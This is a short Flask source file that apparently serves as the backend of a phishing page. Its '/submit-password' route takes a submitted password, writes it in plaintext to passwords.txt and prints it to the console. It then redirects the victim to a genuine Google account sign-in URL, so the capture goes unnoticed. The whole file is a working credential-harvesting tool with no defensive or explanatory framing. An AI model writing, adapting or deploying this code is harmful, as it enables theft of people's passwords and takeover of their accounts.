from flask import Flask, request, render_template, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit-password', methods=['POST'])
def submit_password():
    password = request.form['password']
    with open('passwords.txt', 'a') as file:
        file.write(f"Entered password: {password}\n")
    print(f"Entered password: {password}")  # Optional: Also prints to console
    return redirect('https://accounts.google.com/v3/signin/challenge/kpp?TL=AMbiOOSrNX2X5nee7Mnzxc9l82QvP507u0irZzcrf8RsfhmdM985Mt2dy_6rCcd_&checkConnection=youtube%3A339&checkedDomains=youtube&cid=9&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Fchrome%2Fsync%2Ffinish%3Fest%3DAKuDKfWX2Q6o8xp2_tRKEqQotgV5wUodId4ukirQE9Uda6gFTSdrvxu2hba1TmOtpxKNULLueIepG5_9dz8O0RU%26continue%3Dhttps%3A%2F%2Fwww.google.com%2F&dsh=S589521244%3A1758805554278535&flowName=GlifDesktopChromeSync&pstMsg=1&theme=mn')  # Replace with your website URL

if __name__ == '__main__':
    app.run(debug=True)
